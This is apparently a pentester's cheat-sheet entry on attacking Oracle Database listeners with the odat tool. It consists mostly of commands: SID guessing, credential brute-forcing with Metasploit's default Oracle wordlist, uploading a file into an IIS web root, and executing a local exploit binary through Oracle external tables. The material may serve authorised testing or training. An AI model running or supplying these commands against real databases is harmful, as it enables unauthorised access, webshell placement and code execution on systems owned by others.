# Oracle SQL

https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/Introduction-to-Oracle-SQL.html

Oracle Database



## Tools

`odat` <https://github.com/quentinhardy/odat>

```
# execute the odat with sidguesser
odat sidguesser -s IP -p 1521#default port
# wordlist for creds bf
cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt .
# replace the space in each entry by `:%s/ /\\//g`
odat passworguesser -s IP -d SID 
# The following commands need the user profile to be db admin
# File upload
odat dbmsxslprocessor -s IP -d SID -U USER -P PASS --sysdba --putFile "C:\\inetpub\\wwwroot\\" "output_name" input_file
# There are several command for executing binary via odat, this is just one of them
odat external table -s IP -d SID -U USER -P PASS --sysdba -exec /temp LOCAL_EXPLOIT_BINARY
```